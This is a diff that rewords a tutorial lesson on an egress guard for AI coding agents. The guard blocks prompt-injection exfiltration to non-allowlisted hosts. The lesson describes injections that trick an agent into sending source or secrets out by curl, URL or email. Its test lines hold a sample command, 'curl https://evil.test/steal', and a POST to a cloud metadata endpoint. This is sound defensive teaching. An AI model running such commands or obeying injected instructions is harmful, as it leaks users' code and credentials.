@@ -6,11 +6,11 @@
 
 ## The Problem
 
-The goal of a successful prompt injection is usually **exfiltration**: trick the agent into
-sending your source, secrets, or customer data to an attacker — a `curl` to their server, a
-crafted URL, an email. Output-as-data (lesson 02) stops arbitrary execution; an **egress
-guard** stops the specific dangerous action of reaching a non-allowlisted destination, at the
-moment the agent tries it.
+The goal of a successful prompt injection is usually **exfiltration** — tricking the agent
+into sending your source, secrets, or customer data to an attacker. This can happen through
+a `curl` to their server, a crafted URL, or an email. Output-as-data (lesson 02) stops
+arbitrary execution. An **egress guard** stops the specific dangerous action of reaching a
+non-allowlisted destination, at the moment the agent tries it.
 
 ## The Concept
 
@@ -22,8 +22,8 @@ flowchart LR
   H -- "no" --> BLOCK["deny + alert (default-deny)"]
 ```
 
-This is the Phase 7 egress concept reframed as a *security* control: default-deny outbound,
-allowlist the few hosts you trust, applied as a pre-action guard.
+This is the Phase 7 egress concept reframed as a *security* control. Deny outbound traffic
+by default, allowlist the few hosts you trust, and apply the check as a pre-action guard.
 
 ## Build It
 
@@ -50,15 +50,15 @@ print(guard("curl https://evil.test/steal"))         # blocked
 print(guard("POST data to http://169.254.169.254"))  # blocked (metadata endpoint!)
 ```
 
-Default-deny is the rule: an unrecognized host (including cloud metadata endpoints like
-`169.254.169.254`) is blocked, so an injected exfiltration attempt simply fails.
+Default-deny is the rule. An unrecognized host — including cloud metadata endpoints like
+`169.254.169.254` — gets blocked, so an injected exfiltration attempt simply fails.
 
 ## Use It
 
-Wire this as a PreToolUse hook on the Bash/network tools (Phase 8) — the harness-side belt —
-*and* enforce a real network policy at the infrastructure layer (Phase 7 / Claude Code on the
-web's network policy), which an attacker can't talk past. Defense in depth: the guard catches
-the obvious, the network policy catches the rest.
+Wire this as a PreToolUse hook on the Bash and network tools (Phase 8) — the harness-side
+belt. Also enforce a real network policy at the infrastructure layer (Phase 7, or Claude
+Code on the web's network policy), which an attacker can't talk past. This is defense in
+depth: the guard catches the obvious, and the network policy catches the rest.
 
 ## Ship It
 
